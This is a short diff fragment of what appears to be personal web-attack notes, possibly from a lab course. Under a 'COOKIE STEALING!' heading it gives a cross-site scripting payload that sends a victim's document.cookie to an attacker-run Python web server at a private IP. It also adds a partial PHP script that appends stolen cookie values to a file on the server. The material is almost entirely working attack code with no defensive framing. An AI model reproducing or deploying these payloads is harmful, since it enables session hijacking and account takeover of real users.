@@ -16,13 +16,11 @@ Scraping Data, html
   print ('Results: ',results)
   
 
-
+COOKIE STEALING!
  run on opstation: 
   python3 -m http.server using   <script>document.location="http://10.50.38.82:8000/"+document.cookie;</script>
 
-
-
-
+-----OR-----
 <?php
 $cookie = $_GET["username"]
 $steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
